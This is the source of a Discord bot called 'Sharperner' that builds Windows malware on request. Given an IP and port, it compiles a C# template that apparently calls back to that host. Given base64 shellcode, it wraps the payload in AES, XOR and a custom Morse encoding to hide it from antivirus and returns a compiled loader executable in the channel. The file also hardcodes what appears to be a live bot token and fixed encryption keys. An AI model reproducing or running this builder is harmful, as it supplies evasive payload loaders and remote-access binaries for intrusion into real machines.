#!/usr/bin/env python3
import discord
import os
from discord.ext.commands import Bot
import re
import base64
import binascii
import itertools
from Crypto.Cipher import AES
from Crypto import Random

CSPROJ_ROOT = f"{os.getcwd()}/template"
PROJ_MAIN = f"{CSPROJ_ROOT}/Program.cs"
PROJ_PATH = f"{CSPROJ_ROOT}/Program.csproj"
TEMPLATE_PATH = f"{os.getcwd()}/templates"
PROJ_OUTPUT = f"{CSPROJ_ROOT}/bin/Debug/net45/Program.exe"
COMPILER = "/home/ubuntu/dotnet/dotnet"

MORSE_CODE_DICT = {'a':'.-','A':'^.-','b':'-...','B':'^-...','c':'-.-.','C':'^-.-.','d':'-..','D':'^-..','e':'.','E':'^.','f':'..-.','F':'^..-.','g':'--.','G':'^--.','h':'....','H':'^....','i':'..','I':'^..','j':'.---','J':'^.---','k':'-.-','K':'^-.-','l':'.-..','L':'^.-..','m':'--','M':'^--','n':'-.','N':'^-.','o':'---','O':'^---','p':'.--.','P':'^.--.','q':'--.-','Q':'^--.-','r':'.-.','R':'^.-.','s':'...','S':'^...','t':'-','T':'^-','u':'..-','U':'^..-','v':'...-','V':'^...-','w':'.--','W':'^.--','x':'-..-','X':'^-..-','y':'-.--','Y':'^-.--','z':'--..','Z':'^--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','/':'/','=':'...^-','+':'^.^','!':'^..^'}

TOKEN = "ODY3NTgyMjg1NTAzMzk3OTA4.YPjM9w.tBntzXYYq9FTXa1oqVku_wNtvJg" # remove this later
client = discord.Client()

def _generateShellcodeTemplateFile(template_path,morsed_xor_key,morsed_b64aes_key, morsed_b64aes_iv, morsed_shellcode):
    template = open(template_path).read()
    updated = template.replace("REPLACE SHELLCODE HERE", morsed_shellcode).replace("REPLACE XORKEY", morsed_xor_key).replace("REPLACE A3S_KEY", morsed_b64aes_key).replace("REPLACE A3S_IV", morsed_b64aes_iv)
    return updated

def _generateTemplateFile(template_path,ip_address, port):
    template = open(template_path).read()
    updated = template.replace("REPLACEIP",ip_address).replace("REPLACEPORT",port)
    return updated

def banner():
    help = """```Usage: Sharperner 10.10.10.10 4004```"""
    return help

def parse_cmd(cmd):
    return cmd.split(" ")

def compiled():
    cmd = f"{COMPILER} build --no-restore {PROJ_PATH} 2>/dev/null"
    os.system(cmd)
    if os.path.isfile(PROJ_OUTPUT):
        return True
    else:
        return False

def IsValidNumber(port):
    return port.isnumeric()

def IsValidIp(ip):
    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    if(re.search(regex, ip)):
        return True
    else:
        return False

def isBase64(s):
    try:
        base64.b64decode(s)
        return True
    except binascii.Error:
        return False

def get_crypto_data():
    """
    Uses pbkdf2 to build a KEY and IV pair.
    """
    random = Random.new()
    key = random.read(AES.key_size[0])
    iv = random.read(AES.block_size)
    return (key, iv)

def aes_pad(data: bytes) -> bytes:
    """
    Pad the data to make sure we are %16 == 0
    """
    bs = AES.block_size
    while len(data) % bs != 0:
        data += b"\x90"

    return data

def AESEncrypt(shellcode, key, iv):
    rijn = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = rijn.encrypt(shellcode)
    return ciphertext

def xor_encdec(shellcode, key):
    theKey = bytes(key, 'utf-8')
    encoded = []
    for i in range(0, len(shellcode)):
        encoded.append(shellcode[i] ^ theKey[i % len(theKey)])
    
    return bytes(encoded)

def morse_code_translate(shellcode):
    cipher = ''
    for letter in shellcode:
        if letter in MORSE_CODE_DICT.keys():
            cipher += MORSE_CODE_DICT[letter] + ' '
        else:
            cipher += letter + ' '
    return cipher

@client.event
async def on_ready():
    print(f"We have logged in as {client.user}")

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    
    if message.content.startswith('Sharperner'):
        cmd = parse_cmd(message.content)
        if(len(cmd) == 2):
            blob = cmd[1]
            if isBase64(blob):
                await send_text(message, "Ready for base64")
                raw_payload = aes_pad(base64.b64decode(blob))
                
                # aes encrypt
                aes_key = base64.b64decode("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc=") #temp
                aes_iv = base64.b64decode("bsxnWolsAyO7kCfWuyrnqg==") #temp
                aes_shellcode = AESEncrypt(raw_payload, aes_key, aes_iv)
                
                # xor with random key
                xor_key = "Sup3Rs3cur5k3y!"
                xoraes_shellcode = xor_encdec(aes_shellcode,xor_key)
                b64xoraes_shellcode = base64.b64encode(xoraes_shellcode).decode('utf-8')
                
                # translate to morse code
                b64aes_key = base64.b64encode(aes_key).decode('utf-8')
                b64aes_iv = base64.b64encode(aes_iv).decode('utf-8')

                morsed_xor_key = morse_code_translate(xor_key)
                morsed_b64aes_key = morse_code_translate(b64aes_key)
                morsed_b64aes_iv = morse_code_translate(b64aes_iv)
                morsed_shellcode = morse_code_translate(b64xoraes_shellcode)
                
                template_path = f"{TEMPLATE_PATH}/shellcode_template.cs"
                template = _generateShellcodeTemplateFile(template_path, morsed_xor_key,morsed_b64aes_key, morsed_b64aes_iv, morsed_shellcode)
                f = open(PROJ_MAIN,"w").write(template)

                if compiled():
                    await send_file(message,PROJ_OUTPUT)
                else:
                    await send_text(message, "Sorry dude! something is wrong. Failed to compile")

            else:
                await send_text(message, "invalid base64")
        elif(len(cmd) == 3):
            if(not IsValidIp(cmd[1])):
                await send_text(message, "Invalid ip address")
                return
            elif(not IsValidNumber(cmd[2])):
                await send_text(message, "Invalid port number")
                return
            else:
                ip_address = cmd[1]
                port = cmd[2]
                
                template_path = f"{TEMPLATE_PATH}/template.cs"
                template = _generateTemplateFile(template_path, ip_address, port)
                
                f = open(PROJ_MAIN,"w").write(template)
                
                if compiled():
                    await send_file(message,PROJ_OUTPUT)
                else:
                    await send_text(message, "Sorry dude! something is wrong. Failed to compile")
        else:
            await send_text(message, banner())

async def send_text(message,text):
    await message.channel.send(text)

async def send_file(message,filepath):
    await message.channel.send(file=discord.File(filepath))

client.run(TOKEN)
